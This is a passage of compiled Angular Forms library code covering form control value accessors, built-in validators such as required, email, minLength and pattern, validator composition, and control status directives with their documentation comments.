    }
    /**
     * Registers a function called when the control value changes.
     * @nodoc
     */
    registerOnChange(fn) {
      this.onChange = fn;
    }
    /**
     * Sets the "disabled" property on the range input element.
     * @nodoc
     */
    setDisabledState(isDisabled) {
      this.setProperty("disabled", isDisabled);
    }
  };
  _BaseControlValueAccessor.\u0275fac = function BaseControlValueAccessor_Factory(t) {
    return new (t || _BaseControlValueAccessor)(\u0275\u0275directiveInject(Renderer2), \u0275\u0275directiveInject(ElementRef));
  };
  _BaseControlValueAccessor.\u0275dir = /* @__PURE__ */ \u0275\u0275defineDirective({
    type: _BaseControlValueAccessor
  });
  let BaseControlValueAccessor2 = _BaseControlValueAccessor;
  return BaseControlValueAccessor2;
})();
var BuiltInControlValueAccessor = /* @__PURE__ */ (() => {
  const _BuiltInControlValueAccessor = class _BuiltInControlValueAccessor extends BaseControlValueAccessor {
  };
  _BuiltInControlValueAccessor.\u0275fac = /* @__PURE__ */ (() => {
    let \u0275BuiltInControlValueAccessor_BaseFactory;
    return function BuiltInControlValueAccessor_Factory(t) {
      return (\u0275BuiltInControlValueAccessor_BaseFactory || (\u0275BuiltInControlValueAccessor_BaseFactory = \u0275\u0275getInheritedFactory(_BuiltInControlValueAccessor)))(t || _BuiltInControlValueAccessor);
    };
  })();
  _BuiltInControlValueAccessor.\u0275dir = /* @__PURE__ */ \u0275\u0275defineDirective({
    type: _BuiltInControlValueAccessor,
    features: [\u0275\u0275InheritDefinitionFeature]
  });
  let BuiltInControlValueAccessor2 = _BuiltInControlValueAccessor;
  return BuiltInControlValueAccessor2;
})();
var NG_VALUE_ACCESSOR = /* @__PURE__ */ new InjectionToken("NgValueAccessor");
var CHECKBOX_VALUE_ACCESSOR = {
  provide: NG_VALUE_ACCESSOR,
  useExisting: /* @__PURE__ */ forwardRef(() => CheckboxControlValueAccessor),
  multi: true
};
var CheckboxControlValueAccessor = /* @__PURE__ */ (() => {
  const _CheckboxControlValueAccessor = class _CheckboxControlValueAccessor extends BuiltInControlValueAccessor {
    /**
     * Sets the "checked" property on the input element.
     * @nodoc
     */
    writeValue(value) {
      this.setProperty("checked", value);
    }
  };
  _CheckboxControlValueAccessor.\u0275fac = /* @__PURE__ */ (() => {
    let \u0275CheckboxControlValueAccessor_BaseFactory;
    return function CheckboxControlValueAccessor_Factory(t) {
      return (\u0275CheckboxControlValueAccessor_BaseFactory || (\u0275CheckboxControlValueAccessor_BaseFactory = \u0275\u0275getInheritedFactory(_CheckboxControlValueAccessor)))(t || _CheckboxControlValueAccessor);
    };
  })();
  _CheckboxControlValueAccessor.\u0275dir = /* @__PURE__ */ \u0275\u0275defineDirective({
    type: _CheckboxControlValueAccessor,
    selectors: [["input", "type", "checkbox", "formControlName", ""], ["input", "type", "checkbox", "formControl", ""], ["input", "type", "checkbox", "ngModel", ""]],
    hostBindings: function CheckboxControlValueAccessor_HostBindings(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275listener("change", function CheckboxControlValueAccessor_change_HostBindingHandler($event) {
          return ctx.onChange($event.target.checked);
        })("blur", function CheckboxControlValueAccessor_blur_HostBindingHandler() {
          return ctx.onTouched();
        });
      }
    },
    features: [\u0275\u0275ProvidersFeature([CHECKBOX_VALUE_ACCESSOR]), \u0275\u0275InheritDefinitionFeature]
  });
  let CheckboxControlValueAccessor2 = _CheckboxControlValueAccessor;
  return CheckboxControlValueAccessor2;
})();
var DEFAULT_VALUE_ACCESSOR = {
  provide: NG_VALUE_ACCESSOR,
  useExisting: /* @__PURE__ */ forwardRef(() => DefaultValueAccessor),
  multi: true
};
function _isAndroid() {
  const userAgent = getDOM() ? getDOM().getUserAgent() : "";
  return /android (\d+)/.test(userAgent.toLowerCase());
}
var COMPOSITION_BUFFER_MODE = /* @__PURE__ */ new InjectionToken("CompositionEventMode");
var DefaultValueAccessor = /* @__PURE__ */ (() => {
  const _DefaultValueAccessor = class _DefaultValueAccessor extends BaseControlValueAccessor {
    constructor(renderer, elementRef, _compositionMode) {
      super(renderer, elementRef);
      this._compositionMode = _compositionMode;
      this._composing = false;
      if (this._compositionMode == null) {
        this._compositionMode = !_isAndroid();
      }
    }
    /**
     * Sets the "value" property on the input element.
     * @nodoc
     */
    writeValue(value) {
      const normalizedValue = value == null ? "" : value;
      this.setProperty("value", normalizedValue);
    }
    /** @internal */
    _handleInput(value) {
      if (!this._compositionMode || this._compositionMode && !this._composing) {
        this.onChange(value);
      }
    }
    /** @internal */
    _compositionStart() {
      this._composing = true;
    }
    /** @internal */
    _compositionEnd(value) {
      this._composing = false;
      this._compositionMode && this.onChange(value);
    }
  };
  _DefaultValueAccessor.\u0275fac = function DefaultValueAccessor_Factory(t) {
    return new (t || _DefaultValueAccessor)(\u0275\u0275directiveInject(Renderer2), \u0275\u0275directiveInject(ElementRef), \u0275\u0275directiveInject(COMPOSITION_BUFFER_MODE, 8));
  };
  _DefaultValueAccessor.\u0275dir = /* @__PURE__ */ \u0275\u0275defineDirective({
    type: _DefaultValueAccessor,
    selectors: [["input", "formControlName", "", 3, "type", "checkbox"], ["textarea", "formControlName", ""], ["input", "formControl", "", 3, "type", "checkbox"], ["textarea", "formControl", ""], ["input", "ngModel", "", 3, "type", "checkbox"], ["textarea", "ngModel", ""], ["", "ngDefaultControl", ""]],
    hostBindings: function DefaultValueAccessor_HostBindings(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275listener("input", function DefaultValueAccessor_input_HostBindingHandler($event) {
          return ctx._handleInput($event.target.value);
        })("blur", function DefaultValueAccessor_blur_HostBindingHandler() {
          return ctx.onTouched();
        })("compositionstart", function DefaultValueAccessor_compositionstart_HostBindingHandler() {
          return ctx._compositionStart();
        })("compositionend", function DefaultValueAccessor_compositionend_HostBindingHandler($event) {
          return ctx._compositionEnd($event.target.value);
        });
      }
    },
    features: [\u0275\u0275ProvidersFeature([DEFAULT_VALUE_ACCESSOR]), \u0275\u0275InheritDefinitionFeature]
  });
  let DefaultValueAccessor2 = _DefaultValueAccessor;
  return DefaultValueAccessor2;
})();
function isEmptyInputValue(value) {
  return value == null || (typeof value === "string" || Array.isArray(value)) && value.length === 0;
}
function hasValidLength(value) {
  return value != null && typeof value.length === "number";
}
var NG_VALIDATORS = /* @__PURE__ */ new InjectionToken("NgValidators");
var NG_ASYNC_VALIDATORS = /* @__PURE__ */ new InjectionToken("NgAsyncValidators");
var EMAIL_REGEXP = /^(?=.{1,254}$)(?=.{1,64}@)[a-zA-Z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-zA-Z0-9!#$%&'*+/=?^_`{|}~-]+)*@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
var Validators = class {
  /**
   * @description
   * Validator that requires the control's value to be greater than or equal to the provided number.
   *
   * @usageNotes
   *
   * ### Validate against a minimum of 3
   *
   * ```typescript
   * const control = new FormControl(2, Validators.min(3));
   *
   * console.log(control.errors); // {min: {min: 3, actual: 2}}
   * ```
   *
   * @returns A validator function that returns an error map with the
   * `min` property if the validation check fails, otherwise `null`.
   *
   * @see {@link updateValueAndValidity()}
   *
   */
  static min(min) {
    return minValidator(min);
  }
  /**
   * @description
   * Validator that requires the control's value to be less than or equal to the provided number.
   *
   * @usageNotes
   *
   * ### Validate against a maximum of 15
   *
   * ```typescript
   * const control = new FormControl(16, Validators.max(15));
   *
   * console.log(control.errors); // {max: {max: 15, actual: 16}}
   * ```
   *
   * @returns A validator function that returns an error map with the
   * `max` property if the validation check fails, otherwise `null`.
   *
   * @see {@link updateValueAndValidity()}
   *
   */
  static max(max) {
    return maxValidator(max);
  }
  /**
   * @description
   * Validator that requires the control have a non-empty value.
   *
   * @usageNotes
   *
   * ### Validate that the field is non-empty
   *
   * ```typescript
   * const control = new FormControl('', Validators.required);
   *
   * console.log(control.errors); // {required: true}
   * ```
   *
   * @returns An error map with the `required` property
   * if the validation check fails, otherwise `null`.
   *
   * @see {@link updateValueAndValidity()}
   *
   */
  static required(control) {
    return requiredValidator(control);
  }
  /**
   * @description
   * Validator that requires the control's value be true. This validator is commonly
   * used for required checkboxes.
   *
   * @usageNotes
   *
   * ### Validate that the field value is true
   *
   * ```typescript
   * const control = new FormControl('some value', Validators.requiredTrue);
   *
   * console.log(control.errors); // {required: true}
   * ```
   *
   * @returns An error map that contains the `required` property
   * set to `true` if the validation check fails, otherwise `null`.
   *
   * @see {@link updateValueAndValidity()}
   *
   */
  static requiredTrue(control) {
    return requiredTrueValidator(control);
  }
  /**
   * @description
   * Validator that requires the control's value pass an email validation test.
   *
   * Tests the value using a [regular
   * expression](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)
   * pattern suitable for common use cases. The pattern is based on the definition of a valid email
   * address in the [WHATWG HTML
   * specification](https://html.spec.whatwg.org/multipage/input.html#valid-e-mail-address) with
   * some enhancements to incorporate more RFC rules (such as rules related to domain names and the
   * lengths of different parts of the address).
   *
   * The differences from the WHATWG version include:
   * - Disallow `local-part` (the part before the `@` symbol) to begin or end with a period (`.`).
   * - Disallow `local-part` to be longer than 64 characters.
   * - Disallow the whole address to be longer than 254 characters.
   *
   * If this pattern does not satisfy your business needs, you can use `Validators.pattern()` to
   * validate the value against a different pattern.
   *
   * @usageNotes
   *
   * ### Validate that the field matches a valid email pattern
   *
   * ```typescript
   * const control = new FormControl('bad@', Validators.email);
   *
   * console.log(control.errors); // {email: true}
   * ```
   *
   * @returns An error map with the `email` property
   * if the validation check fails, otherwise `null`.
   *
   * @see {@link updateValueAndValidity()}
   *
   */
  static email(control) {
    return emailValidator(control);
  }
  /**
   * @description
   * Validator that requires the length of the control's value to be greater than or equal
   * to the provided minimum length. This validator is also provided by default if you use the
   * the HTML5 `minlength` attribute. Note that the `minLength` validator is intended to be used
   * only for types that have a numeric `length` property, such as strings or arrays. The
   * `minLength` validator logic is also not invoked for values when their `length` property is 0
   * (for example in case of an empty string or an empty array), to support optional controls. You
   * can use the standard `required` validator if empty values should not be considered valid.
   *
   * @usageNotes
   *
   * ### Validate that the field has a minimum of 3 characters
   *
   * ```typescript
   * const control = new FormControl('ng', Validators.minLength(3));
   *
   * console.log(control.errors); // {minlength: {requiredLength: 3, actualLength: 2}}
   * ```
   *
   * ```html
   * <input minlength="5">
   * ```
   *
   * @returns A validator function that returns an error map with the
   * `minlength` property if the validation check fails, otherwise `null`.
   *
   * @see {@link updateValueAndValidity()}
   *
   */
  static minLength(minLength) {
    return minLengthValidator(minLength);
  }
  /**
   * @description
   * Validator that requires the length of the control's value to be less than or equal
   * to the provided maximum length. This validator is also provided by default if you use the
   * the HTML5 `maxlength` attribute. Note that the `maxLength` validator is intended to be used
   * only for types that have a numeric `length` property, such as strings or arrays.
   *
   * @usageNotes
   *
   * ### Validate that the field has maximum of 5 characters
   *
   * ```typescript
   * const control = new FormControl('Angular', Validators.maxLength(5));
   *
   * console.log(control.errors); // {maxlength: {requiredLength: 5, actualLength: 7}}
   * ```
   *
   * ```html
   * <input maxlength="5">
   * ```
   *
   * @returns A validator function that returns an error map with the
   * `maxlength` property if the validation check fails, otherwise `null`.
   *
   * @see {@link updateValueAndValidity()}
   *
   */
  static maxLength(maxLength) {
    return maxLengthValidator(maxLength);
  }
  /**
   * @description
   * Validator that requires the control's value to match a regex pattern. This validator is also
   * provided by default if you use the HTML5 `pattern` attribute.
   *
   * @usageNotes
   *
   * ### Validate that the field only contains letters or spaces
   *
   * ```typescript
   * const control = new FormControl('1', Validators.pattern('[a-zA-Z ]*'));
   *
   * console.log(control.errors); // {pattern: {requiredPattern: '^[a-zA-Z ]*$', actualValue: '1'}}
   * ```
   *
   * ```html
   * <input pattern="[a-zA-Z ]*">
   * ```
   *
   * ### Pattern matching with the global or sticky flag
   *
   * `RegExp` objects created with the `g` or `y` flags that are passed into `Validators.pattern`
   * can produce different results on the same input when validations are run consecutively. This is
   * due to how the behavior of `RegExp.prototype.test` is
   * specified in [ECMA-262](https://tc39.es/ecma262/#sec-regexpbuiltinexec)
   * (`RegExp` preserves the index of the last match when the global or sticky flag is used).
   * Due to this behavior, it is recommended that when using
   * `Validators.pattern` you **do not** pass in a `RegExp` object with either the global or sticky
   * flag enabled.
   *
   * ```typescript
   * // Not recommended (since the `g` flag is used)
   * const controlOne = new FormControl('1', Validators.pattern(/foo/g));
   *
   * // Good
   * const controlTwo = new FormControl('1', Validators.pattern(/foo/));
   * ```
   *
   * @param pattern A regular expression to be used as is to test the values, or a string.
   * If a string is passed, the `^` character is prepended and the `$` character is
   * appended to the provided string (if not already present), and the resulting regular
   * expression is used to test the values.
   *
   * @returns A validator function that returns an error map with the
   * `pattern` property if the validation check fails, otherwise `null`.
   *
   * @see {@link updateValueAndValidity()}
   *
   */
  static pattern(pattern) {
    return patternValidator(pattern);
  }
  /**
   * @description
   * Validator that performs no operation.
   *
   * @see {@link updateValueAndValidity()}
   *
   */
  static nullValidator(control) {
    return nullValidator(control);
  }
  static compose(validators) {
    return compose(validators);
  }
  /**
   * @description
   * Compose multiple async validators into a single function that returns the union
   * of the individual error objects for the provided control.
   *
   * @returns A validator function that returns an error map with the
   * merged error objects of the async validators if the validation check fails, otherwise `null`.
   *
   * @see {@link updateValueAndValidity()}
   *
   */
  static composeAsync(validators) {
    return composeAsync(validators);
  }
};
function minValidator(min) {
  return (control) => {
    if (isEmptyInputValue(control.value) || isEmptyInputValue(min)) {
      return null;
    }
    const value = parseFloat(control.value);
    return !isNaN(value) && value < min ? {
      "min": {
        "min": min,
        "actual": control.value
      }
    } : null;
  };
}
function maxValidator(max) {
  return (control) => {
    if (isEmptyInputValue(control.value) || isEmptyInputValue(max)) {
      return null;
    }
    const value = parseFloat(control.value);
    return !isNaN(value) && value > max ? {
      "max": {
        "max": max,
        "actual": control.value
      }
    } : null;
  };
}
function requiredValidator(control) {
  return isEmptyInputValue(control.value) ? {
    "required": true
  } : null;
}
function requiredTrueValidator(control) {
  return control.value === true ? null : {
    "required": true
  };
}
function emailValidator(control) {
  if (isEmptyInputValue(control.value)) {
    return null;
  }
  return EMAIL_REGEXP.test(control.value) ? null : {
    "email": true
  };
}
function minLengthValidator(minLength) {
  return (control) => {
    if (isEmptyInputValue(control.value) || !hasValidLength(control.value)) {
      return null;
    }
    return control.value.length < minLength ? {
      "minlength": {
        "requiredLength": minLength,
        "actualLength": control.value.length
      }
    } : null;
  };
}
function maxLengthValidator(maxLength) {
  return (control) => {
    return hasValidLength(control.value) && control.value.length > maxLength ? {
      "maxlength": {
        "requiredLength": maxLength,
        "actualLength": control.value.length
      }
    } : null;
  };
}
function patternValidator(pattern) {
  if (!pattern)
    return nullValidator;
  let regex;
  let regexStr;
  if (typeof pattern === "string") {
    regexStr = "";
    if (pattern.charAt(0) !== "^")
      regexStr += "^";
    regexStr += pattern;
    if (pattern.charAt(pattern.length - 1) !== "$")
      regexStr += "$";
    regex = new RegExp(regexStr);
  } else {
    regexStr = pattern.toString();
    regex = pattern;
  }
  return (control) => {
    if (isEmptyInputValue(control.value)) {
      return null;
    }
    const value = control.value;
    return regex.test(value) ? null : {
      "pattern": {
        "requiredPattern": regexStr,
        "actualValue": value
      }
    };
  };
}
function nullValidator(control) {
  return null;
}
function isPresent(o) {
  return o != null;
}
function toObservable(value) {
  const obs = isPromise(value) ? from(value) : value;
  if ((typeof ngDevMode === "undefined" || ngDevMode) && !isSubscribable(obs)) {
    let errorMessage = `Expected async validator to return Promise or Observable.`;
    if (typeof value === "object") {
      errorMessage += " Are you using a synchronous validator where an async validator is expected?";
    }
    throw new RuntimeError(-1101, errorMessage);
  }
  return obs;
}
function mergeErrors(arrayOfErrors) {
  let res = {};
  arrayOfErrors.forEach((errors) => {
    res = errors != null ? __spreadValues(__spreadValues({}, res), errors) : res;
  });
  return Object.keys(res).length === 0 ? null : res;
}
function executeValidators(control, validators) {
  return validators.map((validator) => validator(control));
}
function isValidatorFn(validator) {
  return !validator.validate;
}
function normalizeValidators(validators) {
  return validators.map((validator) => {
    return isValidatorFn(validator) ? validator : (c) => validator.validate(c);
  });
}
function compose(validators) {
  if (!validators)
    return null;
  const presentValidators = validators.filter(isPresent);
  if (presentValidators.length == 0)
    return null;
  return function(control) {
    return mergeErrors(executeValidators(control, presentValidators));
  };
}
function composeValidators(validators) {
  return validators != null ? compose(normalizeValidators(validators)) : null;
}
function composeAsync(validators) {
  if (!validators)
    return null;
  const presentValidators = validators.filter(isPresent);
  if (presentValidators.length == 0)
    return null;
  return function(control) {
    const observables = executeValidators(control, presentValidators).map(toObservable);
    return forkJoin(observables).pipe(map(mergeErrors));
  };
}
function composeAsyncValidators(validators) {
  return validators != null ? composeAsync(normalizeValidators(validators)) : null;
}
function mergeValidators(controlValidators, dirValidator) {
  if (controlValidators === null)
    return [dirValidator];
  return Array.isArray(controlValidators) ? [...controlValidators, dirValidator] : [controlValidators, dirValidator];
}
function getControlValidators(control) {
  return control._rawValidators;
}
function getControlAsyncValidators(control) {
  return control._rawAsyncValidators;
}
function makeValidatorsArray(validators) {
  if (!validators)
    return [];
  return Array.isArray(validators) ? validators : [validators];
}
function hasValidator(validators, validator) {
  return Array.isArray(validators) ? validators.includes(validator) : validators === validator;
}
function addValidators(validators, currentValidators) {
  const current = makeValidatorsArray(currentValidators);
  const validatorsToAdd = makeValidatorsArray(validators);
  validatorsToAdd.forEach((v) => {
    if (!hasValidator(current, v)) {
      current.push(v);
    }
  });
  return current;
}
function removeValidators(validators, currentValidators) {
  return makeValidatorsArray(currentValidators).filter((v) => !hasValidator(validators, v));
}
var AbstractControlDirective = class {
  constructor() {
    this._rawValidators = [];
    this._rawAsyncValidators = [];
    this._onDestroyCallbacks = [];
  }
  /**
   * @description
   * Reports the value of the control if it is present, otherwise null.
   */
  get value() {
    return this.control ? this.control.value : null;
  }
  /**
   * @description
   * Reports whether the control is valid. A control is considered valid if no
   * validation errors exist with the current value.
   * If the control is not present, null is returned.
   */
  get valid() {
    return this.control ? this.control.valid : null;
  }
  /**
   * @description
   * Reports whether the control is invalid, meaning that an error exists in the input value.
   * If the control is not present, null is returned.
   */
  get invalid() {
    return this.control ? this.control.invalid : null;
  }
  /**
   * @description
   * Reports whether a control is pending, meaning that async validation is occurring and
   * errors are not yet available for the input value. If the control is not present, null is
   * returned.
   */
  get pending() {
    return this.control ? this.control.pending : null;
  }
  /**
   * @description
   * Reports whether the control is disabled, meaning that the control is disabled
   * in the UI and is exempt from validation checks and excluded from aggregate
   * values of ancestor controls. If the control is not present, null is returned.
   */
  get disabled() {
    return this.control ? this.control.disabled : null;
  }
  /**
   * @description
   * Reports whether the control is enabled, meaning that the control is included in ancestor
   * calculations of validity or value. If the control is not present, null is returned.
   */
  get enabled() {
    return this.control ? this.control.enabled : null;
  }
  /**
   * @description
   * Reports the control's validation errors. If the control is not present, null is returned.
   */
  get errors() {
    return this.control ? this.control.errors : null;
  }
  /**
   * @description
   * Reports whether the control is pristine, meaning that the user has not yet changed
   * the value in the UI. If the control is not present, null is returned.
   */
  get pristine() {
    return this.control ? this.control.pristine : null;
  }
  /**
   * @description
   * Reports whether the control is dirty, meaning that the user has changed
   * the value in the UI. If the control is not present, null is returned.
   */
  get dirty() {
    return this.control ? this.control.dirty : null;
  }
  /**
   * @description
   * Reports whether the control is touched, meaning that the user has triggered
   * a `blur` event on it. If the control is not present, null is returned.
   */
  get touched() {
    return this.control ? this.control.touched : null;
  }
  /**
   * @description
   * Reports the validation status of the control. Possible values include:
   * 'VALID', 'INVALID', 'DISABLED', and 'PENDING'.
   * If the control is not present, null is returned.
   */
  get status() {
    return this.control ? this.control.status : null;
  }
  /**
   * @description
   * Reports whether the control is untouched, meaning that the user has not yet triggered
   * a `blur` event on it. If the control is not present, null is returned.
   */
  get untouched() {
    return this.control ? this.control.untouched : null;
  }
  /**
   * @description
   * Returns a multicasting observable that emits a validation status whenever it is
   * calculated for the control. If the control is not present, null is returned.
   */
  get statusChanges() {
    return this.control ? this.control.statusChanges : null;
  }
  /**
   * @description
   * Returns a multicasting observable of value changes for the control that emits every time the
   * value of the control changes in the UI or programmatically.
   * If the control is not present, null is returned.
   */
  get valueChanges() {
    return this.control ? this.control.valueChanges : null;
  }
  /**
   * @description
   * Returns an array that represents the path from the top-level form to this control.
   * Each index is the string name of the control on that level.
   */
  get path() {
    return null;
  }
  /**
   * Sets synchronous validators for this directive.
   * @internal
   */
  _setValidators(validators) {
    this._rawValidators = validators || [];
    this._composedValidatorFn = composeValidators(this._rawValidators);
  }
  /**
   * Sets asynchronous validators for this directive.
   * @internal
   */
  _setAsyncValidators(validators) {
    this._rawAsyncValidators = validators || [];
    this._composedAsyncValidatorFn = composeAsyncValidators(this._rawAsyncValidators);
  }
  /**
   * @description
   * Synchronous validator function composed of all the synchronous validators registered with this
   * directive.
   */
  get validator() {
    return this._composedValidatorFn || null;
  }
  /**
   * @description
   * Asynchronous validator function composed of all the asynchronous validators registered with
   * this directive.
   */
  get asyncValidator() {
    return this._composedAsyncValidatorFn || null;
  }
  /**
   * Internal function to register callbacks that should be invoked
   * when directive instance is being destroyed.
   * @internal
   */
  _registerOnDestroy(fn) {
    this._onDestroyCallbacks.push(fn);
  }
  /**
   * Internal function to invoke all registered "on destroy" callbacks.
   * Note: calling this function also clears the list of callbacks.
   * @internal
   */
  _invokeOnDestroyCallbacks() {
    this._onDestroyCallbacks.forEach((fn) => fn());
    this._onDestroyCallbacks = [];
  }
  /**
   * @description
   * Resets the control with the provided value if the control is present.
   */
  reset(value = void 0) {
    if (this.control)
      this.control.reset(value);
  }
  /**
   * @description
   * Reports whether the control with the given path has the error specified.
   *
   * @param errorCode The code of the error to check
   * @param path A list of control names that designates how to move from the current control
   * to the control that should be queried for errors.
   *
   * @usageNotes
   * For example, for the following `FormGroup`:
   *
   * ```
   * form = new FormGroup({
   *   address: new FormGroup({ street: new FormControl() })
   * });
   * ```
   *
   * The path to the 'street' control from the root form would be 'address' -> 'street'.
   *
   * It can be provided to this method in one of two formats:
   *
   * 1. An array of string control names, e.g. `['address', 'street']`
   * 1. A period-delimited list of control names in one string, e.g. `'address.street'`
   *
   * If no path is given, this method checks for the error on the current control.
   *
   * @returns whether the given error is present in the control at the given path.
   *
   * If the control is not present, false is returned.
   */
  hasError(errorCode, path) {
    return this.control ? this.control.hasError(errorCode, path) : false;
  }
  /**
   * @description
   * Reports error data for the control with the given path.
   *
   * @param errorCode The code of the error to check
   * @param path A list of control names that designates how to move from the current control
   * to the control that should be queried for errors.
   *
   * @usageNotes
   * For example, for the following `FormGroup`:
   *
   * ```
   * form = new FormGroup({
   *   address: new FormGroup({ street: new FormControl() })
   * });
   * ```
   *
   * The path to the 'street' control from the root form would be 'address' -> 'street'.
   *
   * It can be provided to this method in one of two formats:
   *
   * 1. An array of string control names, e.g. `['address', 'street']`
   * 1. A period-delimited list of control names in one string, e.g. `'address.street'`
   *
   * @returns error data for that particular error. If the control or error is not present,
   * null is returned.
   */
  getError(errorCode, path) {
    return this.control ? this.control.getError(errorCode, path) : null;
  }
};
var ControlContainer = class extends AbstractControlDirective {
  /**
   * @description
   * The top-level form directive for the control.
   */
  get formDirective() {
    return null;
  }
  /**
   * @description
   * The path to this group.
   */
  get path() {
    return null;
  }
};
var NgControl = class extends AbstractControlDirective {
  constructor() {
    super(...arguments);
    this._parent = null;
    this.name = null;
    this.valueAccessor = null;
  }
};
var AbstractControlStatus = class {
  constructor(cd) {
    this._cd = cd;
  }
  get isTouched() {
    return !!this._cd?.control?.touched;
  }
  get isUntouched() {
    return !!this._cd?.control?.untouched;
  }
  get isPristine() {
    return !!this._cd?.control?.pristine;
  }
  get isDirty() {
    return !!this._cd?.control?.dirty;
  }
  get isValid() {
    return !!this._cd?.control?.valid;
  }
  get isInvalid() {
    return !!this._cd?.control?.invalid;
  }
  get isPending() {
    return !!this._cd?.control?.pending;
  }
  get isSubmitted() {
    return !!this._cd?.submitted;
  }
};
var ngControlStatusHost = {
  "[class.ng-untouched]": "isUntouched",
  "[class.ng-touched]": "isTouched",
  "[class.ng-pristine]": "isPristine",
  "[class.ng-dirty]": "isDirty",
  "[class.ng-valid]": "isValid",
  "[class.ng-invalid]": "isInvalid",
  "[class.ng-pending]": "isPending"
};
var ngGroupStatusHost = __spreadProps(__spreadValues({}, ngControlStatusHost), {
  "[class.ng-submitted]": "isSubmitted"
});
var NgControlStatus = /* @__PURE__ */ (() => {
  const _NgControlStatus = class _NgControlStatus extends AbstractControlStatus {
    constructor(cd) {
      super(cd);
    }
  };
  _NgControlStatus.\u0275fac = function NgControlStatus_Factory(t) {
    return new (t || _NgControlStatus)(\u0275\u0275directiveInject(NgControl, 2));
  };
  _NgControlStatus.\u0275dir = /* @__PURE__ */ \u0275\u0275defineDirective({
    type: _NgControlStatus,
    selectors: [["", "formControlName", ""], ["", "ngModel", ""], ["", "formControl", ""]],
    hostVars: 14,
    hostBindings: function NgControlStatus_HostBindings(rf, ctx) {
      if (rf & 2) {
        \u0275\u0275classProp("ng-untouched", ctx.isUntouched)("ng-touched", ctx.isTouched)("ng-pristine", ctx.isPristine)("ng-dirty", ctx.isDirty)("ng-valid", ctx.isValid)("ng-invalid", ctx.isInvalid)("ng-pending", ctx.isPending);
      }
    },
    features: [\u0275\u0275InheritDefinitionFeature]
  });
  let NgControlStatus2 = _NgControlStatus;
  return NgControlStatus2;
})();
var NgControlStatusGroup = /* @__PURE__ */ (() => {
  const _NgControlStatusGroup = class _NgControlStatusGroup extends AbstractControlStatus {
    constructor(cd) {
      super(cd);
    }
  };
  _NgControlStatusGroup.\u0275fac = function NgControlStatusGroup_Factory(t) {
    return new (t || _NgControlStatusGroup)(\u0275\u0275directiveInject(ControlContainer, 10));
  };
  _NgControlStatusGroup.\u0275dir = /* @__PURE__ */ \u0275\u0275defineDirective({
    type: _NgControlStatusGroup,
    selectors: [["", "formGroupName", ""], ["", "formArrayName", ""], ["", "ngModelGroup", ""], ["", "formGroup", ""], ["form", 3, "ngNoForm", ""], ["", "ngForm", ""]],
    hostVars: 16,
    hostBindings: function NgControlStatusGroup_HostBindings(rf, ctx) {
      if (rf & 2) {
        \u0275\u0275classProp("ng-untouched", ctx.isUntouched)("ng-touched", ctx.isTouched)("ng-pristine", ctx.isPristine)("ng-dirty", ctx.isDirty)("ng-valid", ctx.isValid)("ng-invalid", ctx.isInvalid)("ng-pending", ctx.isPending)("ng-submitted", ctx.isSubmitted);
      }
    },
    features: [\u0275\u0275InheritDefinitionFeature]
  });
  let NgControlStatusGroup2 = _NgControlStatusGroup;
  return NgControlStatusGroup2;
})();
var formControlNameExample = `
  <div [formGroup]="myGroup">
    <input formControlName="firstName">
  </div>

  In your class:

  this.myGroup = new FormGroup({
      firstName: new FormControl()
  });`;
var formGroupNameExample = `
  <div [formGroup]="myGroup">
      <div formGroupName="person">
        <input formControlName="firstName">
      </div>
  </div>

  In your class:

  this.myGroup = new FormGroup({
      person: new FormGroup({ firstName: new FormControl() })
  });`;
var formArrayNameExample = `
  <div [formGroup]="myGroup">
    <div formArrayName="cities">
      <div *ngFor="let city of cityArray.controls; index as i">
        <input [formControlName]="i">
      </div>
    </div>
  </div>

  In your class:

  this.cityArray = new FormArray([new FormControl('SF')]);
  this.myGroup = new FormGroup({
    cities: this.cityArray
  });`;
var ngModelGroupExample = `
  <form>
      <div ngModelGroup="person">
        <input [(ngModel)]="person.name" name="firstName">
      </div>
  </form>`;
function controlParentException() {
  return new RuntimeError(1050, `formControlName must be used with a parent formGroup directive.  You'll want to add a formGroup
      directive and pass it an existing FormGroup instance (you can create one in your class).

    Example:

    ${formControlNameExample}`);
}
function ngModelGroupException() {
  return new RuntimeError(1051, `formControlName cannot be used with an ngModelGroup parent. It is only compatible with parents
      that also have a "form" prefix: formGroupName, formArrayName, or formGroup.

      Option 1:  Update the parent to be formGroupName (reactive form strategy)

      ${formGroupNameExample}

      Option 2: Use ngModel instead of formControlName (template-driven strategy)

      ${ngModelGroupExample}`);
}
function missingFormException() {
  return new RuntimeError(1052, `formGroup expects a FormGroup instance. Please pass one in.

      Example:

      ${formControlNameExample}`);
}
function groupParentException() {
  return new RuntimeError(1053, `formGroupName must be used with a parent formGroup directive.  You'll want to add a formGroup
    directive and pass it an existing FormGroup instance (you can create one in your class).

    Example:

    ${formGroupNameExample}`);
}
function arrayParentException() {
  return new RuntimeError(1054, `formArrayName must be used with a parent formGroup directive.  You'll want to add a formGroup
      directive and pass it an existing FormGroup instance (you can create one in your class).

      Example:

      ${formArrayNameExample}`);
}
var disabledAttrWarning = `
  It looks like you're using the disabled attribute with a reactive form directive. If you set disabled to true
  when you set up this control in your component class, the disabled attribute will actually be set in the DOM for
  you. We recommend using this approach to avoid 'changed after checked' errors.

  Example:
  // Specify the \`disabled\` property at control creation time:
  form = new FormGroup({
    first: new FormControl({value: 'Nancy', disabled: true}, Validators.required),
    last: new FormControl('Drew', Validators.required)
  });

  // Controls can also be enabled/disabled after creation:
  form.get('first')?.enable();
  form.get('last')?.disable();
`;
var asyncValidatorsDroppedWithOptsWarning = `
  It looks like you're constructing using a FormControl with both an options argument and an
  async validators argument. Mixing these arguments will cause your async validators to be dropped.
  You should either put all your validators in the options object, or in separate validators
  arguments. For example:

  // Using validators arguments
  fc = new FormControl(42, Validators.required, myAsyncValidator);

  // Using AbstractControlOptions
  fc = new FormControl(42, {validators: Validators.required, asyncValidators: myAV});

  // Do NOT mix them: async validators will be dropped!
  fc = new FormControl(42, {validators: Validators.required}, /* Oops! */ myAsyncValidator);
`;
function ngModelWarning(directiveName) {
  return `
  It looks like you're using ngModel on the same form field as ${directiveName}.
  Support for using the ngModel input property and ngModelChange event with
  reactive form directives has been deprecated in Angular v6 and will be removed
